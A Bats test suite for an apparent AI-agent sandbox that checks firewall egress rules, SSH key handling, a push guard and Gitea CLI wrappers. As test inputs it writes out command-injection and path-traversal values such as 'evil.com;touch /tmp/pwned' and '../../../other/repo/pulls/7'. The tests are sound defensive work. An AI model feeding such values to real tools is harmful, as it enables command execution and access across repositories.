    # via PATH. A bare `dirname "${BASH_SOURCE[0]}"` (no readlink -f first)
    # resolves against the symlink's own directory in that case, not this
    # repo's real bin/ - a real bug hit on first use: dejima tried
    # to open ~/.local/docker/docker-compose.yml instead of this repo's.
    grep -q 'dirname "\$(readlink -f "\${BASH_SOURCE\[0\]}")"' "$REPO_ROOT/bin/dejima"
    grep -q 'dirname "\$(readlink -f "\${BASH_SOURCE\[0\]}")"' "$REPO_ROOT/bin/dejima-allow"
}

@test "bin/dejima-allow rejects a domain with shell metacharacters" {
    run "$REPO_ROOT/bin/dejima-allow" 'evil.com;touch /tmp/pwned'
    [ "$status" -ne 0 ]
    [[ "$output" == *"Not a valid domain"* ]]
}

@test "bin/dejima-allow rejects a domain with a slash (dnsmasq server= delimiter)" {
    run "$REPO_ROOT/bin/dejima-allow" 'evil.com/../etc'
    [ "$status" -ne 0 ]
    [[ "$output" == *"Not a valid domain"* ]]
}

@test "bin/dejima-allow accepts a well-formed domain (passes validation)" {
    # --container points at a name that can't exist, so this can *never*
    # reach a real running dejima session (and mutate its live
    # firewall) even if the machine running this test happens to have one -
    # it must fail at "container not found", not at validation.
    run "$REPO_ROOT/bin/dejima-allow" --container dejima-test-suite-nonexistent-target 'crates.io'
    [ "$status" -ne 0 ]
    [[ "$output" != *"Not a valid domain"* ]]
}

@test "the dedicated SSH key mount is optional, not a hard requirement" {
    grep -qE '^\s*-\s*\$\{SANDBOX_SSH_KEY_FILE:-/dev/null\}:/root/\.ssh-sandbox-key-src:ro\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -qE '^\s*-\s*\$\{SSH_AUTH_SOCK:-/dev/null\}:/ssh-agent\s*$' "$SANDBOX_DIR/docker-compose.yml"
}

@test "the dedicated SSH key source is mounted under /root, not the sandbox user's home" {
    # A mount under \$SANDBOX_HOME would be readable by the sandbox user
    # directly, since its uid now matches the host user's (see Dockerfile) -
    # /root is only reachable by root, which is all that should ever read
    # this file (see entrypoint.sh).
    run grep -E '\.ssh-sandbox-key-src' "$SANDBOX_DIR/docker-compose.yml"
    [[ "$output" != *'${HOME}'* ]]
    run grep -F 'SANDBOX_SSH_KEY_SRC=' "$SANDBOX_DIR/entrypoint.sh"
    [[ "$output" != *'SANDBOX_HOME'* ]]
    grep -qF 'SANDBOX_SSH_KEY_SRC="/root/.ssh-sandbox-key-src"' "$SANDBOX_DIR/entrypoint.sh"
}

@test "entrypoint.sh deletes the plaintext dedicated-key copy after loading it into the agent" {
    grep -q 'gosu "$SANDBOX_USER" ssh-add' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'rm -f "$SANDBOX_HOME/.ssh/sandbox-key"' "$SANDBOX_DIR/entrypoint.sh"
    ssh_add_line=$(grep -n 'gosu "$SANDBOX_USER" ssh-add' "$SANDBOX_DIR/entrypoint.sh" | head -1 | cut -d: -f1)
    rm_line=$(grep -n 'rm -f "$SANDBOX_HOME/.ssh/sandbox-key"' "$SANDBOX_DIR/entrypoint.sh" | head -1 | cut -d: -f1)
    [ "$rm_line" -gt "$ssh_add_line" ]
}

@test "bin/dejima allows a dedicated SANDBOX_SSH_KEY in place of a forwarded agent" {
    grep -q 'SANDBOX_SSH_KEY' "$REPO_ROOT/bin/dejima"
    grep -q 'export SANDBOX_SSH_KEY_FILE' "$REPO_ROOT/bin/dejima"
}

@test "bin/dejima warns when SANDBOX_SSH_KEY looks like a default personal key" {
    grep -q 'looks like a default personal SSH key' "$REPO_ROOT/bin/dejima"
    run grep -E '^\s*id_rsa\|id_ecdsa\|id_ed25519\|id_dsa\|id_ecdsa_sk\|id_ed25519_sk\)\s*$' "$REPO_ROOT/bin/dejima"
    [ "$status" -eq 0 ]
}


@test "the ranges fetch is given GH_TOKEN when one is set" {
    # Unauthenticated /meta is capped at 60 requests/hour per source IP, shared
    # across every container start; exhausting it fails the launch. The token
    # is composed into a whole header by the launch path and read by the policy
    # as one, so the scheme stays the caller's to choose.
    grep -q 'EGRESS_FORGE_META_AUTH="Authorization: Bearer \$GH_TOKEN"' "$SANDBOX_DIR/firewall-up.sh" \
        || { echo "firewall-up.sh does not pass GH_TOKEN to the ranges fetch"; return 1; }
    grep -q 'FORGE_META_AUTH=\${EGRESS_FORGE_META_AUTH:-}' "$SANDBOX_DIR/egress-policy" \
        || { echo "egress-policy does not read the credential it is given"; return 1; }
    grep -q 'auth=(-H "\$FORGE_META_AUTH")' "$SANDBOX_DIR/egress-policy" \
        || { echo "the credential never becomes a request header"; return 1; }
}


@test "ALLOW_GITHUB_PUSH defaults to 0 everywhere it's read" {
    grep -qE '^\s*ALLOW_GITHUB_PUSH:\s*\$\{ALLOW_GITHUB_PUSH:-0\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    grep -q 'EGRESS_FORGE_SSH="\${ALLOW_GITHUB_PUSH:-0}"' "$SANDBOX_DIR/firewall-up.sh"
    grep -q 'FORGE_SSH=\${EGRESS_FORGE_SSH:-0}' "$SANDBOX_DIR/egress-policy"
}


@test "port 22 to the forge opens only under the push opt-in, and 443 always" {
    # The read-only guarantee: with 22 closed there is no transport left for a
    # forwarded agent key to authenticate a push with, whatever a hook does or
    # does not catch. So 443 is unconditional and 22 exists only inside the
    # opt-in - never as a second unconditional rule beside it.
    local clamp
    clamp=$(sed -n '/^emit_forge_clamp()/,/^}/p' "$SANDBOX_DIR/egress-policy")
    grep -q "tcp dport 443 goto permit" <<< "$clamp" \
        || { echo "the forge class is not permitted on 443"; return 1; }
    # Everything else about the class is refused, which is what makes the
    # restriction hold however the address was arrived at.
    grep -q 'daddr @%s goto refuse' <<< "$clamp" \
        || { echo "the forge class is not refused on other ports"; return 1; }

    local port22_line if_line
    port22_line=$(grep -n 'tcp dport 22 goto permit' <<< "$clamp" | head -1 | cut -d: -f1)
    [ -n "$port22_line" ] || { echo "port 22 cannot be opened at all"; return 1; }
    if_line=$(grep -n 'FORGE_SSH" = 1' <<< "$clamp" | head -1 | cut -d: -f1)
    [ -n "$if_line" ] || { echo "port 22 is not behind the opt-in"; return 1; }
    [ "$port22_line" -gt "$if_line" ] \
        || { echo "the port 22 rule is outside the opt-in conditional"; return 1; }

    # The self-check proves it at runtime rather than trusting the rules, and
    # only when the opt-in is off - with it on there is nothing to assert.
    grep -q 'verify_port_refused "\$answer" 22' "$SANDBOX_DIR/egress-policy" \
        || { echo "nothing checks that 22 is actually refused without the opt-in"; return 1; }
}

@test "git-push-guard.sh blocks direct pushes to a branch named in DEJIMA_BLOCKED_BRANCHES" {
    d="$(mktemp -d)"
    git -C "$d" init -q
    git -C "$d" remote add origin git@anywhere.example:x/y
    git -C "$d" checkout -qb main
    payload="$(printf '{"tool_input":{"command":"git push origin main"},"cwd":"%s"}' "$d")"
    run env DEJIMA=1 DEJIMA_PUSH_HOSTS="anywhere.example" DEJIMA_BLOCKED_BRANCHES="main master" \
        bash -c 'printf "%s" "$1" | bash "$2"' _ "$payload" "$REPO_ROOT/hooks/git-push-guard.sh"
    [ "$status" -eq 2 ]
    rm -rf "$d"
}

@test "no gitea CLI passes the token as a command-line argument" {
    # /proc makes argv world-readable, so a token in a curl invocation is
    # visible to every other process for the life of the request - and this
    # runs alongside agents that read process listings.
    #
    # Every file, because they are deliberate copies of each other rather
    # than a shared library (see forges/gitea/bin/gitea-issue's header for
    # why), and a duplicated security property is exactly the kind that
    # drifts.
    local f
    for f in forges/gitea/bin/gitea-pr forges/gitea/bin/gitea-issue forges/gitea/bin/gitea-actions; do
        run grep -n 'curl.*Authorization: token' "$REPO_ROOT/$f"
        [ "$status" -ne 0 ]
        grep -q 'curl -sS -w .*-K -' "$REPO_ROOT/$f"
    done
}

@test "both gitea CLIs take a body from a file, and refuse to guess between two" {
    # Prose on a command line has to survive shell quoting, and an
    # apostrophe or a backtick is the common case, not the edge one. A body
    # that arrives via a file never enters argv at all.
    local f
    for f in forges/gitea/bin/gitea-pr forges/gitea/bin/gitea-issue; do
        grep -q -- '--body-file' "$REPO_ROOT/$f"
        # '-' means stdin, so a heredoc works without a temp file.
        grep -q 'file" = "-"' "$REPO_ROOT/$f"
        # Passing both is an error rather than a precedence rule: silently
        # picking one ships a body the caller did not mean to send.
        grep -q 'not both' "$REPO_ROOT/$f"
    done
}

# Runs a gitea CLI against a stub `curl` that records the request instead of
# making one, from a throwaway repo whose origin looks like the configured
# Gitea host. Every one of these tools reaches the network through a single
# `curl -K -` call, so this is their whole outbound surface.
#
# The stub answers the way gitea_api's callers parse: the body, then the
# status on its own line (which is what `-w '\n%{http_code}'` appends).
gitea_cli() {
    local cli="$1"; shift
    local d="$BATS_TEST_TMPDIR/cli"
    if [ ! -d "$d" ]; then
        mkdir -p "$d/stub" "$d/repo"
        cat > "$d/stub/curl" <<'STUB'
#!/bin/bash
prev=""
payload=""
for a in "$@"; do
    if [ "$prev" = "-d" ]; then
        payload="$a"
        printf '%s' "$a" > "$STUB_PAYLOAD"
    fi
    prev="$a"
done
cat >/dev/null
# A request carrying a body is a write, and its callers read one object
# back; the reads these tools make before writing are list endpoints, whose
# callers iterate. Answering both with the same shape would fail on the jq
# rather than on anything under test.
if [ -n "$payload" ]; then
    echo '{"html_url": "https://forge.invalid/x/y/pulls/1"}'
else
    # Reads answer `[]` unless the URL is one a test needs shaped data from.
    # `comments` walks reviews and then each review's own comments, so an
    # empty list at the first hop means the second never runs and the
    # rendering under test is never reached.
    url=""
    for a in "$@"; do case "$a" in https://*) url="$a" ;; esac; done
    # Match on the path, not the whole URL: list reads carry ?limit&page, and
    # a pattern anchored at the end of the string stops matching the moment
    # one does.
    url="${url%%\?*}"
    case "$url" in
        */reviews/*/comments)
            # Three comments, two of them one thread. The resolved thread has a
            # reply carrying `resolver: null`, because Gitea stamps only a
            # thread's root - which is the case that made a closed thread read
            # as open.
            echo '[{"user":{"login":"reviewer"},"path":"docs/thing.md","position":118,"resolver":null,"diff_hunk":"@@ -105,0 +115,2 @@\n+a line the reviewer is looking at","body":"this bit is confusing"},{"user":{"login":"reviewer"},"path":"docs/other.md","position":42,"resolver":{"login":"reviewer"},"diff_hunk":"@@ -1,0 +42,1 @@\n+a line already dealt with","body":"already handled"},{"user":{"login":"reviewer"},"path":"docs/other.md","position":42,"resolver":null,"diff_hunk":"@@ -1,0 +42,1 @@\n+a line already dealt with","body":"a reply inside the closed thread"}]' ;;
        */reviews)
            echo '[{"id":32,"user":{"login":"reviewer"},"submitted_at":"2026-01-01T00:00:00Z","state":"COMMENTED","body":"","comments_count":1}]' ;;
        *)
            echo '[]' ;;
    esac
fi
echo 200
STUB
        chmod +x "$d/stub/curl"
        git -C "$d/repo" init -q -b feature
        # Identity passed per-command rather than inherited: a CI container
        # has no git config, and `commit` there exits 128 with "Author
        # identity unknown" - a precondition this suite was taking from
        # whoever ran it. The commit exists only so create's
        # `rev-parse --abbrev-ref HEAD` has a branch to report.
        git -C "$d/repo" -c user.name=t -c user.email=t@invalid \
            commit -q --allow-empty -m seed
        git -C "$d/repo" remote add origin git@forge.invalid:owner/name.git
    fi
    : > "$d/payload"
    ( cd "$d/repo" && env PATH="$d/stub:$PATH" \
        GITEA_SSH_HOST=forge.invalid GITEA_API=https://forge.invalid/api/v1 \
        GITEA_TOKEN=stub-token STUB_PAYLOAD="$d/payload" \
        "$REPO_ROOT/forges/gitea/bin/$cli" "$@" )
}

# What was in the -d of the last gitea_cli call.
cli_payload() { cat "$BATS_TEST_TMPDIR/cli/payload"; }

@test "gitea-pr says which base it is opening against, and takes one per repo" {
    # Every pull request this project opened for a fortnight went to the
    # repository's default branch while being reported as targeting another,
    # and the only reason anyone found out is that a person retargeted each
    # one by hand. Nothing gitea-pr printed said otherwise: a URL looks the
    # same whichever branch it is against.
    local d="$BATS_TEST_TMPDIR/cli/repo"

    # No --base and nothing configured: whatever the repository's default is,
    # said out loud.
    run gitea_cli gitea-pr create --title T --body B
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"opening against"* ]] \
        || { echo "did not say which base: $output"; return 1; }

    # Configured once per repository, for a project whose work does not target
    # its default branch. This is the case that was silently getting it wrong.
    git -C "$d" config gitea.prBase development
    run gitea_cli gitea-pr create --title T --body B
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(cli_payload | jq -r '.base')" = "development" ] \
        || { echo "sent base $(cli_payload | jq -r '.base')"; return 1; }
    [[ "$output" == *"opening against 'development'"* ]] \
        || { echo "did not name the configured base: $output"; return 1; }

    # An explicit --base still wins, and is still announced.
    run gitea_cli gitea-pr create --title T --body B --base other
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [ "$(cli_payload | jq -r '.base')" = "other" ] \
        || { echo "--base was ignored: $(cli_payload | jq -r '.base')"; return 1; }
    [[ "$output" == *"opening against 'other'"* ]] \
        || { echo "did not name the explicit base: $output"; return 1; }
    git -C "$d" config --unset gitea.prBase
}

# curl normalises dot-segments, so a PR "number" that is really a path
# reaches a different repo's endpoint with this token on it. `edit` always
# checked; the other two took the argument as given.
@test "every gitea-pr subcommand taking a PR number refuses one that is a path" {
    local sub bad
    for sub in comments merge edit; do
        for bad in '../../../other/repo/pulls/7' '7abc' 'x'; do
            run gitea_cli gitea-pr "$sub" "$bad"
            [ "$status" -ne 0 ] \
                || { echo "gitea-pr $sub accepted '$bad'"; return 1; }
            [[ "$output" == *"Expected a PR number"* ]] \
                || { echo "gitea-pr $sub '$bad': $output"; return 1; }
        done
    done
}

@test "a PR-number subcommand with no argument says how to call it" {
    # "no argument" and "wrong argument" are different mistakes: one wants the
    # usage line, the other wants to know what was wrong with what was given.
    local sub=merge
    run gitea_cli gitea-pr "$sub"
    [ "$status" -ne 0 ]
    [[ "$output" == *"Usage:"* ]] || { echo "$output"; return 1; }
}

# A paginating stub: full pages until the last one, so a caller that reads
# page one and stops sees a prefix of the list and cannot tell that it did.
paginating_cli() {
    local cli="$1"; shift
    local d="$BATS_TEST_TMPDIR/pcli"
    if [ ! -d "$d" ]; then
        mkdir -p "$d/stub" "$d/repo"
        cat > "$d/stub/curl" <<'STUB'
#!/bin/bash
url=""
for a in "$@"; do case "$a" in https://*) url="$a" ;; esac; done
cat >/dev/null
page=1; limit=50
case "$url" in *page=*) page="${url##*page=}"; page="${page%%&*}" ;; esac
case "$url" in *limit=*) limit="${url##*limit=}"; limit="${limit%%&*}" ;; esac
emit() {
    local n="$1" start="$2" i out=""
    for ((i = 0; i < n; i++)); do
        out="$out,{\"id\":$((start + i)),\"user\":{\"login\":\"u\"},\"created_at\":\"t\",\"body\":\"comment-$((start + i))\"}"
    done
    echo "[${out#,}]"
}
case "$url" in
    */issues/*/comments*)
        # Two full pages and a short third: 105 comments in all.
        if   [ "$page" = 1 ]; then emit "$limit" 0
        elif [ "$page" = 2 ]; then emit "$limit" "$limit"
        elif [ "$page" = 3 ]; then emit 5 $((limit * 2))
        else echo '[]'; fi ;;
    *) echo '[]' ;;
esac
echo 200
STUB
        chmod +x "$d/stub/curl"
        git -C "$d/repo" init -q -b feature
        git -C "$d/repo" -c user.name=t -c user.email=t@invalid \
            commit -q --allow-empty -m seed
        git -C "$d/repo" remote add origin git@forge.invalid:owner/name.git
    fi
    ( cd "$d/repo" && env PATH="$d/stub:$PATH" \
        GITEA_SSH_HOST=forge.invalid GITEA_API=https://forge.invalid/api/v1 \
        GITEA_TOKEN=stub-token \
        "$REPO_ROOT/forges/gitea/bin/$cli" "$@" )
}

@test "gitea-pr comments reads past the first page of feedback" {
    # The documented review loop is `gitea-pr comments <n>`, act, repeat. A
    # read that stops at the server's page size drops the rest silently, so
    # whoever is addressing the review never learns the rest exists.
    run paginating_cli gitea-pr comments 1
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"comment-0"* ]] || { echo "the first page is missing"; return 1; }
    [[ "$output" == *"comment-50"* ]] || { echo "the second page was not read"; return 1; }
    [[ "$output" == *"comment-104"* ]] || { echo "the last page was not read"; return 1; }
}

@test "an inline review comment arrives with the diff it was left against" {
    # Gitea's review-comment objects have no `line` field, so the old
    # `\(.line // "?")` rendered every comment as `path:?`. A reviewer who
    # writes "this is confusing" about a passage is pointing at something they
    # can see and the reader cannot, and the reader then has to guess which
    # passage. `diff_hunk` is what removes the guess.
    run gitea_cli gitea-pr comments 1
    [ "$status" -eq 0 ]

    # The hunk itself, not merely the file it came from.
    [[ "$output" == *"a line the reviewer is looking at"* ]]
    [[ "$output" == *"@@ -105,0 +115,2 @@"* ]]
    # Attributed and located, with the diff offset rather than a bare `?`.
    [[ "$output" == *"[reviewer @ docs/thing.md @@118]"* ]]
    [[ "$output" != *":?]"* ]]
    # And the comment, distinguishable from the quoted code above it.
    [[ "$output" == *"--- comment ---"* ]]
    [[ "$output" == *"this bit is confusing"* ]]
}

@test "a resolved thread stays hidden, including a reply that carries no resolver" {
    # The trap this exists for: Gitea marks only a thread's ROOT comment as
    # resolved. A reply inside a closed thread comes back with
    # `resolver: null`, so judging each comment on its own reports a thread
    # you already dealt with as still needing an answer. On a real review that
    # meant hunting for a passage that had already been rewritten.
    run gitea_cli gitea-pr comments 1
    [ "$status" -eq 0 ]

    # The genuinely open one is there.
    [[ "$output" == *"this bit is confusing"* ]]
    # Neither half of the closed thread is, the reply included.
    [[ "$output" != *"already handled"* ]]
    [[ "$output" != *"a reply inside the closed thread"* ]]
    # And it says what it withheld rather than silently shrinking the list.
    [[ "$output" == *"1 resolved thread(s) hidden"* ]]
}

@test "--all includes resolved threads and marks them as resolved" {
    run gitea_cli gitea-pr comments 1 --all
    [ "$status" -eq 0 ]

    [[ "$output" == *"this bit is confusing"* ]]
    [[ "$output" == *"already handled"* ]]
    [[ "$output" == *"a reply inside the closed thread"* ]]
    # Marked, so a reader is not left to work out which are which.
    [[ "$output" == *"docs/other.md @@42  (resolved)"* ]]
    # The open one carries no marker.
    [[ "$output" == *"[reviewer @ docs/thing.md @@118]"* ]]
    # Nothing is hidden, so nothing is announced as hidden.
    [[ "$output" != *"hidden"* ]]
}

@test "an edit sends only the fields it was given, so a title edit cannot blank a body" {
    # The half of #79 that was silent: an agent that said it had updated a
    # description had not, because there was no way to. Sending a fixed
    # {title, body} pair instead would have traded that for a worse bug -
    # every title-only edit wiping the description.
    local cli
    for cli in gitea-pr gitea-issue; do
        gitea_cli "$cli" edit 1 --title "a new title"
        [ "$(cli_payload | jq -r '.title')" = "a new title" ]
        [ "$(cli_payload | jq 'has("body")')" = "false" ]

        gitea_cli "$cli" edit 1 --body "a new body"
        [ "$(cli_payload | jq 'has("title")')" = "false" ]
        # Verbatim, marker and all. The provenance marker used to be added
        # here and is now added by the shadow, which covers every forge rather
        # than the ones whose CLI this repo wrote; that an edit does not shed
        # it is tested there, against the same list that puts it on a create.
        [ "$(cli_payload | jq -r '.body')" = "a new body" ]
    done
}

@test "an edit with neither a title nor a body is refused rather than sent empty" {
    local cli
    for cli in gitea-pr gitea-issue; do
        run gitea_cli "$cli" edit 1
        [ "$status" -ne 0 ]
        [[ "$output" == *"requires --title"* ]]
        # Nothing reached the network to be refused by the far end instead.
        [ ! -s "$BATS_TEST_TMPDIR/cli/payload" ]
    done
}

@test "create still sends head, base, title and body after sharing a parser with edit" {
    # create's own argument parsing moved into the function edit uses, so
    # that the two cannot disagree about --body vs --body-file. This is the
    # side of that move with no test of its own before now.
    gitea_cli gitea-pr create --title "a title" --body "a body" --base trunk
    [ "$(cli_payload | jq -r '.head')" = "feature" ]
    [ "$(cli_payload | jq -r '.base')" = "trunk" ]
    [ "$(cli_payload | jq -r '.title')" = "a title" ]
    [[ "$(cli_payload | jq -r '.body')" == *"a body"* ]]
}

@test "an edit takes its body from a file, the same way create does" {
    # The flag that matters inside the sandbox: a body written to a file
    # never enters the Bash command string deny-dangerous-bash.sh reads.
    echo "body out of a file" > "$BATS_TEST_TMPDIR/b.md"
    gitea_cli gitea-pr edit 1 --body-file "$BATS_TEST_TMPDIR/b.md"
    [[ "$(cli_payload | jq -r '.body')" == *"body out of a file"* ]]
}

@test "gitea-issue list asks for issues only, never pull requests" {
    # Gitea's issues endpoint returns PRs too - a PR is an issue with a
    # branch attached - so without type=issues every open PR shows up as an
    # issue and the work list reads as twice as long as it is.
    grep -q 'type=issues' "$REPO_ROOT/forges/gitea/bin/gitea-issue"
}

# A run carries two numbers: the per-workflow counter this tool lists (225)
# and the repo-wide index its web URL and every status target_url use (11387).
# They are equal on a fresh instance and diverge for good once a second
# workflow runs, so a tool that filters statuses by the first finds nothing at
# all - `jobs` reported "no jobs" for a run whose twelve jobs were right
# there, and `logs` could not reach the one that failed.
#
# The stub gives them deliberately different values, which is the only shape
# that tells the two apart.
actions_cli() {
    local d="$BATS_TEST_TMPDIR/acli"
    if [ ! -d "$d" ]; then
        mkdir -p "$d/stub" "$d/repo"
        cat > "$d/stub/curl" <<'STUB'
#!/bin/bash
url=""
for a in "$@"; do case "$a" in https://*) url="$a" ;; esac; done
cat >/dev/null
case "$url" in
    */actions/tasks*)
        cat <<'JSON'
{"workflow_runs":[
 {"id":2663,"run_number":225,"name":"privileged","head_sha":"deadbeefdeadbeef",
  "status":"failure","event":"pull_request_target","display_title":"a change",
  "url":"https://forge.invalid/owner/name/actions/runs/11387"},
 {"id":2662,"run_number":225,"name":"confined (static)","head_sha":"deadbeefdeadbeef",
  "status":"success","event":"pull_request_target","display_title":"a change",
  "url":"https://forge.invalid/owner/name/actions/runs/11387"}
]}
JSON
        ;;
    */statuses*)
        # target_url carries the WEB id. A filter keyed on run_number matches
        # none of these.
        cat <<'JSON'
[{"status":"failure","context":"tests / privileged (pull_request_target)",
  "target_url":"/owner/name/actions/runs/11387/jobs/13320"},
 {"status":"success","context":"tests / confined (static) (pull_request_target)",
  "target_url":"/owner/name/actions/runs/11387/jobs/13318"}]
JSON
        ;;
    *) echo '[]' ;;
esac
echo 200
STUB
        chmod +x "$d/stub/curl"
        git -C "$d/repo" init -q -b feature
        git -C "$d/repo" -c user.name=t -c user.email=t@invalid \
            commit -q --allow-empty -m seed
        git -C "$d/repo" remote add origin git@forge.invalid:owner/name.git
    fi
    ( cd "$d/repo" && env PATH="$d/stub:$PATH" \
        GITEA_SSH_HOST=forge.invalid GITEA_API=https://forge.invalid/api/v1 \
        GITEA_TOKEN=stub-token \
        "$REPO_ROOT/forges/gitea/bin/gitea-actions" "$@" )
}

@test "gitea-actions finds a run's jobs when its two numbers differ" {
    run actions_cli jobs 225
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    [[ "$output" == *"privileged"* ]] \
        || { echo "the failed job is missing:"; echo "$output"; return 1; }
    [[ "$output" == *"13320"* ]] || { echo "$output"; return 1; }
    [[ "$output" != *"reports no jobs"* ]] \
        || { echo "the run-number filter matched nothing again"; return 1; }
}

@test "gitea-actions accepts either of a run's two numbers" {
    # `runs` prints one and the usage has always described the other, so both
    # have been told to people.
    local by_number by_web
    by_number="$(actions_cli jobs 225)"
    by_web="$(actions_cli jobs 11387)"
    [ "$by_number" = "$by_web" ] || {
        echo "the two forms disagree:"; echo "$by_number"; echo "--"; echo "$by_web"; return 1; }
}

@test "gitea-actions addresses a job's log by the id its URL uses" {
    # The log endpoint is under the web id too, so a request built from
    # run_number 404s - which api_or_die reports as a failed fetch rather than
    # as the wrong number having been used.
    grep -q 'actions/runs/\${run_web_id}/jobs/\${index}/logs' \
        "$REPO_ROOT/forges/gitea/bin/gitea-actions" \
        || { echo "the log URL is not keyed on the web id"; return 1; }
}

@test "gitea-actions only reads - it issues no request that could change anything" {
    # It authenticates with the same write-scoped token as gitea-pr, so
    # "it only fetches runs and logs" has to be a property of the file and
    # not merely of what its subcommands are named.
    run grep -nE '\-X (POST|PUT|PATCH|DELETE)|--data|[^a-z-]-d ' \
        "$REPO_ROOT/forges/gitea/bin/gitea-actions"
    [ "$status" -ne 0 ]
}

@test "gitea-actions asks for nothing that needs to own the repo" {
    # Gitea gates /repos/{o}/{r}/actions/runs - and the job and log endpoints
    # reached through it - behind reqOwner(). A sandbox should hold a token
    # for a dedicated account that is a collaborator and nothing more, and
    # that account is refused there with "user should be the owner of the
    # repo". No scope grants ownership, so a reader who hits this reaches for
    # a wider token, which is the wrong direction and the reason this is
    # pinned rather than left to the comment explaining it.
    #
    # Anchored on GITEA_API, not on the path: the log route is a web URL
    # under the same-looking /actions/runs/N/jobs/M prefix, and it is fine.
    local f="$REPO_ROOT/forges/gitea/bin/gitea-actions"
    run grep -nE '\$\{?GITEA_API\}?[^"]*actions/(runs|jobs)' "$f"
    [ "$status" -ne 0 ]
    # The three it may use instead, each reachable with plain read access.
    grep -q 'actions/tasks' "$f"
    grep -q 'commits/.*statuses' "$f"
    grep -q 'GITEA_WEB' "$f"
}

@test "the gitea CLIs format their own tables, rather than shelling out to column" {
    # util-linux's `column` is not in the sandbox image, and it is the last
    # command in the pipeline - so a missing one fails with 127 after the
    # request has already succeeded, which reads as an API problem rather
    # than a missing tool. bin/dejima-audit and bin/dejima-attach pad with
    # printf for the same reason; this keeps the forge CLIs consistent with
    # them.
    run grep -rn 'column -t' "$REPO_ROOT/forges/"
    [ "$status" -ne 0 ]
}

@test "gitea-issue is installed into the image alongside gitea-pr" {
    grep -q 'COPY forges/' "$SANDBOX_DIR/Dockerfile"
    # Through the manifest's install list, not a find over the directory
    # layout - see "what ships into the image is what a manifest declares".
    grep -q 'install-forge-bins.sh' "$SANDBOX_DIR/Dockerfile"
    [ -x "$REPO_ROOT/forges/gitea/bin/gitea-pr" ]
    [ -x "$REPO_ROOT/forges/gitea/bin/gitea-issue" ]
}

# install-forge-bins.sh, with every command a manifest declares as `system:`
# stubbed onto PATH first.
#
# The image guarantees those commands - that is what declaring them means - but
# a contributor's checkout and the CI runner do not, and CI is where this was
# noticed: gh is present in a dejima container and absent on the runner, so
# these tests passed locally and failed there. A test that reads the machine it
# runs on is testing the machine.
#
# The names come from the manifests rather than a list here, so a forge that
# declares another one later needs no change to this.
_install_forge_bins() {
    local stub="$BATS_TEST_TMPDIR/systemstub" name
    mkdir -p "$stub"
    for name in $(sed -n 's/^install *= *//p' "$REPO_ROOT"/forges/*/forge.conf \
                    | tr ' ' '\n' | sed -n 's/^system://p'); do
        printf '#!/bin/sh\nexit 0\n' > "$stub/$name"
        chmod +x "$stub/$name"
    done
    PATH="$stub:$PATH" bash "$REPO_ROOT/docker/install-forge-bins.sh" "$@"
}

# forges/ is inside the audit's TCB, so `install =` in a forge manifest is a
# claim an operator is entitled to read as "this forge puts nothing else
# executable in the image". The image build enforces it, but that is the slow
# tier and only runs where Docker does; this catches a file added under a
# forge's bin/ without a declaration at the same time as the rest of the
# static checks, which is when someone is still looking at the change.
@test "what ships into the image is what a manifest declares, both ways" {
    local dest
    dest="$(mktemp -d)"
    run _install_forge_bins "$REPO_ROOT/forges" "$dest/lib" "$dest/bin"
    [ "$status" -eq 0 ] || { echo "$output"; rm -rf "$dest"; return 1; }
    # Nothing under any forge's bin/ was skipped, and nothing else appeared.
    # A file under a bin/ with no declaration is caught by the run above
    # failing, which is what leaves this free to read the filesystem for the
    # shipped-from-the-repo half rather than trusting the manifests for both.
    local shipped declared
    shipped="$(cd "$dest/bin" && ls | sort)"
    declared="$( { find "$REPO_ROOT/forges" -type f -path '*/bin/*' -printf '%f\n'
                   sed -n 's/^install *= *//p' "$REPO_ROOT"/forges/*/forge.conf \
                       | tr ' ' '\n' | sed -n 's/^system://p'
                 } | sort )"
    rm -rf "$dest"
    [ "$shipped" = "$declared" ] || {
        echo "installed:"; echo "$shipped"; echo "present under a bin/:"; echo "$declared"; return 1; }
}

@test "an undeclared file under a forge's bin/ fails the image build" {
    local fake dest
    fake="$(mktemp -d)"; dest="$(mktemp -d)"
    cp -r "$REPO_ROOT"/forges/. "$fake/"
    mkdir -p "$fake/github/bin"
    printf '#!/bin/sh\necho hi\n' > "$fake/github/bin/undeclared"
    # Stubbed like the rest: this has to fail because of the undeclared file,
    # not because the machine happens to be missing a declared system command.
    run _install_forge_bins "$fake" "$dest/lib" "$dest/bin"
    [ "$status" -ne 0 ] || { echo "an undeclared CLI installed anyway"; rm -rf "$fake" "$dest"; return 1; }
    [[ "$output" == *"does not declare it"* ]] \
        || { echo "failed for another reason: $output"; rm -rf "$fake" "$dest"; return 1; }
    [ ! -e "$dest/undeclared" ]
    rm -rf "$fake" "$dest"
}

@test "a declared file a forge does not ship fails the image build" {
    local fake dest
    fake="$(mktemp -d)"; dest="$(mktemp -d)"
    cp -r "$REPO_ROOT"/forges/. "$fake/"
    rm "$fake/gitea/bin/gitea-pr"
    run _install_forge_bins "$fake" "$dest/lib" "$dest/bin"
    [ "$status" -ne 0 ] || { echo "a missing declared CLI passed"; rm -rf "$fake" "$dest"; return 1; }
    [[ "$output" == *"which it does not ship"* ]] \
        || { echo "failed for another reason: $output"; rm -rf "$fake" "$dest"; return 1; }
    rm -rf "$fake" "$dest"
}

@test "the release pass refuses a base that is behind its own upstream" {
    # Everything the pass prints is derived from base..head - which manual
    # checks apply, which config keys a rollback would refuse - so a base
    # behind the real one reports on a different release, confidently. Two
    # passes ran against a local `main` 260 commits behind origin/main and
    # named keys and a domain that had shipped releases earlier.
    grep -q 'behind its own upstream\|behind \$base_upstream\|commit(s) behind' \
        "$REPO_ROOT/test/release-pass.sh" \
        || { echo "the staleness check is gone"; return 1; }
    # The default is the tracking ref, not the local branch, so the ordinary
    # invocation cannot pick up a stale one in the first place.
    grep -q 'base=origin/main' "$REPO_ROOT/test/release-pass.sh" \
        || { echo "the default base is not the tracking ref"; return 1; }
    # And it exits rather than warning: a gate that says something is wrong
    # and then reports anyway is one whose output still gets pasted into a
    # release PR.
    sed -n '/is .* behind /,/^fi$/p' "$REPO_ROOT/test/release-pass.sh" \
        | grep -q 'exit 1' \
